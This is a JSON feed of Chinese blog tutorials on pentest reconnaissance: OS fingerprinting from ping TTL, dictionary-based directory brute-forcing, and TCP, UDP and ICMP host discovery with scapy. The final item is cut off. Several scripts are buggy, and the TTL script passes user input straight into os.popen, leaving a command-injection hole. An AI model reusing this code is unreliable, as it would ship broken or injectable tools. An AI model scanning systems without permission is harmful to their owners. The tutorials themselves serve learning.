{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "description": "",
    "home_page_url": "https://nnnpc.github.io",
    "items": [
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/",
            "title": "主动信息收集------系统识别",
            "date_published": "2024-04-16T05:58:19.074Z",
            "content_html": "<blockquote>\n<p>识别出目标主机操作系统的类型和版本，可以大量减少不必要的测试版本，缩小测试范围，更精确地针对目标进行渗透测试<br>\n但是判断目标地操作系统并非一件简单的事情。因为现在的操作系统类型繁多，仅 Windows 和 Linux 就包含了许多衍生系统，同时，现今的防火墙、路由器、智能设备等都有其自带的操作系统，所以需要精确判断目标操作系统的类型并非易事。目前主要通过 &quot;指纹识别&quot; 的方式来对目标的操作系统来进行猜测。检测方法一般分为两种：主动式探测和被动式探测。<br>\n主动式探测：向目标主机发送一段特定的数据包，根据目标主机对数据包做出的回应进行分析，判断目标主机中可能的操作系统类型。和被动探测比起来，主动的方式肯定更为准确，但也同时因为是直接对目标主机进行发送而更容易触发目标安全系统的警报</p>\n</blockquote>\n<p>被动式探测：通过工具嗅探、记录、分析数据包流。根据数据包信息来分析目标主机的操作系统。与主动探测相比，被动探测的结果虽然可能没有那么精确，但是不容易被目标主机的安全系统察觉</p>\n<p>主机识别的原理：Windows 操作系统与 Linux 的操作系统的 TCP/IP 实现方式并不一样，导致对特定格式数据包的回应也不相同，包括响应数据中的内容、响应时间等，就形成了操作系统的指纹。通常的情况下，可以对主机进行 ping 之后根据返回的 TTL 值来判断系统类型</p>\n<p>Windows TTL 起始值：128</p>\n<p>Linux TTL 起始值：64</p>\n<p>每经过一条路由，TTL 值 - 1</p>\n<p>这里就不做界面演示了，可以直接去找 Windows 和 Linux 的机子去 ping 一下看看 TTL 值</p>\n<p>接下来就使用返回 TTL 值的原理来用 python 程序实现自动化探测主机系统类型</p>\n<p>导入程序代码所应用的模块：optparse、os 和 re。optparse 用于生成命令行参数；os 用于执行系统命令；re 为正则表达式模块，用于匹配返回的 TTL 值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">import os</span><br><span class=\"line\">import re</span><br></pre></td></tr></table></figure>\n<p>利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行接收和批量处理，最后将处理后的 IP 地址传入 ttl_scan () 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    parser = OptionParser(&quot;Usage:%prog -i &lt;target host&gt;&quot;) #输出帮助信息</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;,type=&#x27;string&#x27;,dest=&#x27;IP&#x27;,help=&#x27;specify target host&#x27;)</span><br><span class=\"line\">    #获取IP地址参数</span><br><span class=\"line\">    options,args = parser.parse_args()</span><br><span class=\"line\">    ip = options.IP</span><br><span class=\"line\">    ttl_scan(ip)</span><br><span class=\"line\">    </span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>调用 os.popen () 函数执行 ping 命令，并将返回的结果通过正则表达式识别，提取出 TTL 值。当 TTL 值小于等于 64 时，操作系统为 Linux 类型，输出 &quot;xx.xx.xx.xx<br>\nis Linux/UNIX&quot;，否则输出&quot;xx.xx.xx.xx is Windows&quot;。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def ttl_scan(ip):</span><br><span class=\"line\">    ttlstrmatch = re.compile(r&#x27;ttl=\\d+&#x27;)</span><br><span class=\"line\">    ttlnummatch = re.compile(r&#x27;\\d+&#x27;)</span><br><span class=\"line\">    result = os.popen(&quot;ping -c 1 &quot; + ip)</span><br><span class=\"line\">    res = result.read()</span><br><span class=\"line\">    for line in res.splitlines():</span><br><span class=\"line\">        result = ttlstrmatch.findall(line)</span><br><span class=\"line\">        if result:</span><br><span class=\"line\">            ttl = ttlnummatch.findall(line)</span><br><span class=\"line\">            if int(ttl[0]) &lt;= 64:  # 判断目标主机响应包中TTL值是否小于等于64</span><br><span class=\"line\">                print(&quot;%s is Linux/UNIX&quot; % ip)  # TTL&lt;=64时为Linux/UNIX系统</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(&quot;%s is Windows&quot; % ip)  # 反之则为Windows系统</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            pass</span><br></pre></td></tr></table></figure>\n<p>一个简易的检测脚本就完成了，使用方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./host.py -i IP</span><br></pre></td></tr></table></figure>\n<p>一般来说，主动的主机系统类型探测就是向目标主机发送特定数据包，然后用目标主机的回应包中的数据与指纹库来进行对比，从而得出主机系统类型，这里的脚本化简了这一流程。直接通过 ping 和返回的 TTL 值来对主机系统类型进行一个判断</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%8E%A2%E6%B5%8B/",
            "title": "主动信息收集------敏感目录探测",
            "date_published": "2024-04-16T05:58:19.071Z",
            "content_html": "<blockquote>\n<p>资源发现属于信息收集的一部分，善于发现隐藏信息，如隐藏目录、隐藏文件等，可提高渗透测试的全面细致性。接下来就用 Python 实现敏感目录的发现。在渗透测试过程中，资源发现是极其重要的一环。具备好的资源发现能力能够令整个工作事半功倍。<br>\n在渗透测试过程中进行目录扫描是很有必要的，例如，当发现开发过程中未关闭或者忘记关闭的页面，可能就会发现许多可以利用的信息，接下来编写一个基于字典的目录扫描脚本<br>\n要进行网页的目录扫描，就需要进行网页访问，所以先导入 requests 模块备用，然后等待用户输入 url 和字典</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = input(&quot;url:&quot;)</span><br><span class=\"line\">txt = input(&#x27;php.txt&#x27;)</span><br></pre></td></tr></table></figure>\n<p>当用户没有输入字典时，默认打开根目录的 php.txt，然后将字典中的内容放进队列中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url_list = []</span><br><span class=\"line\">if txt == &quot;&quot;:</span><br><span class=\"line\">    txt = &quot;php.txt&quot;</span><br><span class=\"line\">try:</span><br><span class=\"line\">    with open(txt,&#x27;r&#x27;) as f:</span><br><span class=\"line\">        for a in f:</span><br><span class=\"line\">            a = a.replace(&#x27;\\n&#x27;,&#x27;&#x27;)</span><br><span class=\"line\">            url_list.append(a)</span><br><span class=\"line\">        f.close()</span><br><span class=\"line\">except:</span><br><span class=\"line\">    print(&quot;error!&quot;)</span><br></pre></td></tr></table></figure>\n<p>将队列中的内容拼接到 url 中组成需要验证的地址，通过返回值来判断是否存在此目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for li in url_list:</span><br><span class=\"line\">    conn = &quot;http://&quot; + url + &quot;&quot; +li</span><br><span class=\"line\"></span><br><span class=\"line\">    try:</span><br><span class=\"line\">        response = requests.get(conn,headers = headers)</span><br><span class=\"line\">        print(&quot;%s---------------%s&quot; % (conn,response))</span><br><span class=\"line\">    except error.HTTPError as e:</span><br><span class=\"line\">        print(&#x27;%s---------------%s&#x27; %(conn,e.code))</span><br><span class=\"line\">    except error.URLError :</span><br><span class=\"line\">         print(&quot;域名访问失败！&quot;)</span><br><span class=\"line\">         exit(1)</span><br></pre></td></tr></table></figure>\n<p>原理比较简单，可以理解为用字典进行的暴力破解，就是通过需要请求的 url 和字典中的可能存在泄露的目录进行拼接以后挨个访问，用返回的状态码来显示目录是否存在</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8ETCP%E3%80%81UDP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8ETCP%E3%80%81UDP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "title": "主动信息收集------基于TCP、UDP的主机发现",
            "date_published": "2024-04-16T05:58:19.070Z",
            "content_html": "<blockquote>\n<p>基于 TCP、UDP 的主机发现属于四层主机发现，是一个位于传输层的协议。可以用来探测远程主机存活、端口开放、服务类型以及系统类型等信息，相比于三层主机发现更为可靠，用途更广<br>\n<strong> TCP</strong> 是一种面向连接的、可靠的传输通信协议，位于 IP 层之上，应用层之下的中间层。它每一次建立连接都需要经过三次握手，终止一次连接也需要四次挥手（四次握手），建立完成之后才能进行传输数据。详解：</p>\n</blockquote>\n<p><a href=\"https://nnnpc.github.io/2022/11/18/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/\">https://nnnpc.github.io/2022/11/18 / 关于 TCP 与 UDP 协议的学习 /</a><br>\nTCP 建立的连接可以有效防止丢包和服务器一直在最后的确认状态导致无法关闭的情况发生，因此 TCP 是一个可靠的传输协议</p>\n<p>我们可以利用 TCP 的三次握手来进行主机存活的探测。有两种方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.向目标主机直接发送ACK数据包，如果目标主机存活，就会返回一RST数据包来终止这个不正常的TCP连接</span><br><span class=\"line\">2.发送正常的SYN数据包，如果目标主机返回SYN/ACK或者RST包，也可以证明主机为存活状态</span><br></pre></td></tr></table></figure>\n<p>工作原理主要依据响应数据包中 flags 字段，如果该字段有值则说明主机存活，该字段通常包括 SYN、FIN、ACK、PSH、RST、URG 六种类型。发送 SYN 包表示是建立连接，而发送 FIN 包表示的是关闭连接，ACK 是应答，PSH 表示包含 data 数据传输，RST 表示连接重置，URG 表示紧急指针<br>\n知道了原理和方法之后就可以来编写脚本了，这里还是使用 scapy 库来完成，先进行一个小测试</p>\n<p>首先导入应该用的模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from telnetlib import IP</span><br><span class=\"line\">from scapy.all import *</span><br><span class=\"line\">from scapy.layers.inet import TCP</span><br></pre></td></tr></table></figure>\n<p>接着用 a.display () 函数来查看目标主机的返回数据包信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip = IP()</span><br><span class=\"line\">tcp = TCP()</span><br><span class=\"line\">r = (ip/tcp)</span><br><span class=\"line\">r[IP].dst = &quot;（需要判断的主机IP）&quot;</span><br><span class=\"line\">r[TCP].flags = &quot;A&quot;</span><br><span class=\"line\">a = sr1(r)</span><br><span class=\"line\">a.display()</span><br></pre></td></tr></table></figure>\n<p>结果为：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8xwGKAgwr0dyAmsj.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>可以明显的看到返回值为返回数据包的标志位为 R，证明主机存活，表示远程主机给源主机发送了一个 REST</p>\n<p>根据以上 TCP 发现主机存活的测试，就可以编写相应的工具来探测主机存活了</p>\n<p>先导入程序代码所应用到的模块：time、optparse、random 和 scapy。time 模块主要用于产生延迟时间，optparse 用于生成命令行参数，random 模块用于生成随机的端口，scapy 用于以 TCP 发送请求以及接受应答数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">from random import randint</span><br><span class=\"line\">from scapy.all import *</span><br></pre></td></tr></table></figure>\n<p>接着利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行接收和批量处理，最后将处理后的 IP 地址传入 Scan () 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    usage = &quot;Usage:%prog -i &lt;ip address&gt;&quot;   #输出帮助信息</span><br><span class=\"line\">    parse = OptionParser(usage=usage)</span><br><span class=\"line\">    parse.add_option(&quot;-i&quot;,&#x27;--ip&#x27;,type=&quot;string&quot;,dest=&quot;targetIP&quot;,help=&quot;specify the IP address&quot;)</span><br><span class=\"line\">    options,args = parse.parse_args()</span><br><span class=\"line\">    if &#x27;-&#x27; in options.targetIP:</span><br><span class=\"line\">        for i in range(int(options.tagetIP.split(&#x27;-&#x27;)[0].split(&#x27;-&#x27;)[3]), int(options.targetIP.split(&#x27;-&#x27;)[1]) + 1):</span><br><span class=\"line\">            Scan(</span><br><span class=\"line\">                options.targetIP.split(&#x27;.&#x27;)[0] + &#x27;.&#x27; + options.targetIP.split(&#x27;.&#x27;)[1] + &#x27;.&#x27; + options.targetIP.split(&#x27;.&#x27;)[2] + &#x27;.&#x27; + str(</span><br><span class=\"line\">                    i)</span><br><span class=\"line\">            )</span><br><span class=\"line\">            time.sleep(0.2)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        Scan(options.targetIP)</span><br><span class=\"line\">      </span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>Scan () 函数，通过调用 TCP 将构造好的请求包发送到目的地址，并且根据目标主机返回的数据包中的 flags 字段值判断主机是否存活。若 flags 字段为 R，其整性数值为 4 时表示接收到了目标主机的 REST，目标主机为存活状态</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Scan():</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        dport = random.randint(1.65535)</span><br><span class=\"line\">        packeet = IP(dst=ip)/TCP(flags=&quot;A&quot;,dport=dport)</span><br><span class=\"line\">        response = sr1(packet,timeout=11.0,verbose=0)</span><br><span class=\"line\">        if response:</span><br><span class=\"line\">            if int(response[TCP].flags) == 4:</span><br><span class=\"line\">                time.sleep(0.5)</span><br><span class=\"line\">                print(ip + &#x27; &#x27;+&quot;is up&quot;)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(ip + &#x27; &#x27;+&quot;is down&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(ip + &#x27;&#x27; + &quot;is down&quot;)</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure>\n<p><strong>UDP</strong> 是一种利用 IP 提供提供面向无连接的网络通信服务。UDP 会把应用程序发来的数据，在收到的一刻立即原样发送到网络上。即使在网络传输过程中出现丢包、顺序错乱等情况时，UDP 也不会负责重新发送以及纠错。当向目标发送一个 UDP 数据包之后，目标是不会发回任何 UDP 数据包的。但是如果目标主机处于活跃状态并且目标端口关闭，则会返回一个 ICMP 数据包，这个数据包的含义为 unreachable。如果目标主机不处于活跃状态，这是是收不到任何响应数据的。利用这个原理可以实现探测存活主机</p>\n<p>现在来利用该原理浅浅编写一个程序测试一下，同样利用 scapy 库来完成，首先先导入需要用到的库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from telnetlib import IP</span><br><span class=\"line\">from scapy.all import *</span><br><span class=\"line\">from scapy.layers.inet import UDP</span><br></pre></td></tr></table></figure>\n<p>接着利用 UDP 协议来判断主机是否存活</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip = IP()</span><br><span class=\"line\">udp = UDP()</span><br><span class=\"line\">r = (ip/udp)</span><br><span class=\"line\">r[IP].dst = &quot;（需要判断的主机IP）&quot;</span><br><span class=\"line\">r[UDP].dport = 7345</span><br><span class=\"line\">a = sr1(r)</span><br><span class=\"line\">a.display()</span><br></pre></td></tr></table></figure>\n<p>如果目标主机存活，就会接收到目标主机的应答信息。看到返回信息中存在 ICMP 的应答信息，&quot;code=port-unreachable&quot; 表示目标端口不可达，这样就可以验证远程主机存活了，如果不存活则不会收到目标机子的响应数据包<br>\n接下来就可以根据测试结果和原理来编写相应的 python 工具了</p>\n<p>首先需要导入需要用到的模块：time、optparse、random 和 scapy</p>\n<blockquote>\n<p>time：用于产生延迟时间<br>\n optparse：用于生成命令行参数<br>\n random：用于生成随机的端口<br>\n scapy：用于以 UDP 发送请求以及接收应答数据</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">from random import randint</span><br><span class=\"line\">from scapy.all import *</span><br><span class=\"line\">from telnetlib import IP</span><br><span class=\"line\">from scapy.layers.inet import UDP</span><br></pre></td></tr></table></figure>\n<p>接着利用 optparse 模块生成命令行参数化形式，对用户输入的参数进行批量接收和处理，并将结果传入 Scan () 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main():</span><br><span class=\"line\">    usage = &quot;Usage:%prog -i &lt;ip address&gt;&quot;  # 输出帮助信息</span><br><span class=\"line\">    parse = OptionParser(usage=usage)</span><br><span class=\"line\">    parse.add_option(&quot;-i&quot;, &#x27;--ip&#x27;, type=&quot;string&quot;, dest=&quot;targetIP&quot;, help=&quot;specify the IP address&quot;)</span><br><span class=\"line\">    options, args = parse.parse_args()</span><br><span class=\"line\">    if &#x27;-&#x27; in options.targetIP:</span><br><span class=\"line\">        for i in range(int(options.tagetIP.split(&#x27;-&#x27;)[0].split(&#x27;-&#x27;)[3]), int(options.targetIP.split(&#x27;-&#x27;)[1]) + 1):</span><br><span class=\"line\">            Scan(</span><br><span class=\"line\">                options.targetIP.split(&#x27;.&#x27;)[0] + &#x27;.&#x27; + options.targetIP.split(&#x27;.&#x27;)[1] + &#x27;.&#x27; +</span><br><span class=\"line\">                options.targetIP.split(&#x27;.&#x27;)[2] + &#x27;.&#x27; + str(</span><br><span class=\"line\">                    i)</span><br><span class=\"line\">            )</span><br><span class=\"line\">            time.sleep(0.2)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        Scan(options.targetIP)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>main () 函数中的内容与利用 TCP 协议判断存活主机的 main () 中的内容一样，不同之处在 Scan 函数的协议与判断方式<br>\n通过调用 UDP 将构造好的包发送到目标地址，并根据是否接收到目标的响应包来判断目标机子是否存活，当 proto 字段为 1 时则判断为存活状态，否则不存活</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Scan(ip):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        dport = random.randint(1,65535)</span><br><span class=\"line\">        packet = IP(dst=ip)/UDP(dport=dport)</span><br><span class=\"line\">        response = sr1(packet,timeout=1.0,verbose=0)</span><br><span class=\"line\">        if response:</span><br><span class=\"line\">            if int(response[IP].proto) == 1:</span><br><span class=\"line\">                time.sleep(0.5)</span><br><span class=\"line\">                print(ip + &#x27; &#x27; + &quot;is up&quot;)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(ip + &#x27; &#x27; + &quot;is down&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(ip + &#x27; &#x27; + &quot;is down&quot;)</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure>\n<p>同时也可以使用 nmap 库利用 TCP 和 UDP 协议来进行探测，修改 Scan () 函数中的代码即可（调用函数来使用相应的参数）</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EICMP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8EICMP%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/",
            "title": "主动信息收集------基于ICMP的主机发现",
            "date_published": "2024-04-16T05:58:19.068Z",
            "content_html": "<blockquote>\n<p>ICMP(Internet Control Message<br>\nProtocol，Internet 报文协议) 是 TCP/IP 的一种子协议，位于 OSI7 层网络模型中的网络层，其目的是用于在 IP 主机、路由器之前传递控制信息<br>\n OS17 层网络模型</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PTXM2FQSmK1RmU69.png!thumbnail\" alt=\"\"></p>\n<blockquote>\n<p>图片来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXVuamlzdWFuY2hlbmd6aGFuZ2x1L3AvMTY1MDIzMDcuaHRtbA==\"> https://www.cnblogs.com/yunjisuanchengzhanglu/p/16502307.html</span></p>\n</blockquote>\n<p><strong>ICMP 工作流程</strong></p>\n<p>ICMP 中提供了多种报文，这些报文又可以分成两大类：“差错通知 &quot;和&quot; 信息查询”</p>\n<p><strong>差错通知</strong></p>\n<p>当 IP 数据包在对方计算机处理过程中出现未知的发送错误时，ICMP 会向发送者传送错误事实以及错误原因等，示意图如下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rANoIf2yrmzE72fY.png!thumbnail\" alt=\"\"></p>\n<p><strong>信息查询</strong></p>\n<p>信息查询由一个请求和一个应答构成的。只需要向目标发送一个请求数据包，如果收到了来自目标的回应，就可以判断目标是活跃主机，否则可以判断目标是非活跃主机，示意图如下</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NaMzEdM0TcqGBqgt.png!thumbnail\" alt=\"\"></p>\n<p><strong>ICMP 主机探测过程</strong></p>\n<p>Ping 命令是 ICMP 中较为常见的一种应用，经常使用这个命令来测试本地与目标之前的连通性，发送一个 ICMP 请求消息给目标主机，若源主机收到目标主机的应答响应消息，则表示目标可达，主机存在。例如想要判断某一台主机是否为存活主机，那么 ping 一下该主机，查看有无回应即可判断是否存活</p>\n<p>现在来编写一个利用 ICMP 实现探测活跃主机的代码程序。程序有很多种可实现的方法，这里借助 Scapy 库来完成。它是 python 中的一个第三方库，在 Scapy 库中已经实现了大量的网络协议。如 TCP、UDP、IP、ARP 等，使用该库可以灵活编写各种网络工具。</p>\n<p>首先安装 Scapy</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install scapy</span><br></pre></td></tr></table></figure>\n<p>接下来就可以进行实现了<br>\n 1. 导入程序代码所应用到的模块：scapy、random、optparse，其中 scapy 用于发送 ping 请求和接受目标主机的应答数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from scapy.all import *</span><br><span class=\"line\">from random import randint</span><br><span class=\"line\">from optparse import OptionParser</span><br></pre></td></tr></table></figure>\n<p>对用户输入的参数进行接受和批量处理，并将处理后的 IP 地址传入 Scan 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 